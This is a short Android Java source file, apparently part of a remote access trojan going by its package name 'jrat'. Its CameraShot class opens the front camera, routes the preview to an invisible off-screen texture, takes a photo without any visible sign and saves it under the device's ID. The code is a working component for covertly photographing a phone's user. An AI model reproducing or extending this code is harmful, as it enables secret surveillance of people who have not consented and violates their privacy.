package com.julioxus.jrat;

import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.os.Environment;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;

/**
 * Created by Juan on 03/06/2016.
 */
public class CameraShot {

    SurfaceTexture surfaceTexture ;
    Camera myCamera;
    String android_id;
    String fileName;


    public CameraShot(String android_id){
        this.android_id = android_id;
        myCamera = Camera.open(Camera.CameraInfo.CAMERA_FACING_FRONT);
        surfaceTexture = new SurfaceTexture(10);
    }

    private void takePhoto() {

        Camera.Parameters parameters = myCamera.getParameters();
        myCamera.setParameters(parameters);
        try {
            myCamera.setPreviewTexture(surfaceTexture);
            myCamera.startPreview();
            myCamera.takePicture(null, null, photoCallback);
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

    Camera.PictureCallback photoCallback=new Camera.PictureCallback() {
        public void onPictureTaken(byte[] data, Camera camera) {
            savePhoto(data);
        }
    };

    public void savePhoto(byte[] data){
        try {
            String root = Environment.getExternalStorageDirectory().toString();
            fileName = root + "/" +android_id+"photo.jpg";
            File file = new File(fileName);
            FileOutputStream out = new FileOutputStream(file);
            out.write(data);
            out.flush();
            out.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e){
            e.printStackTrace();
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    public String getFileName() {
        return fileName;
    }

}
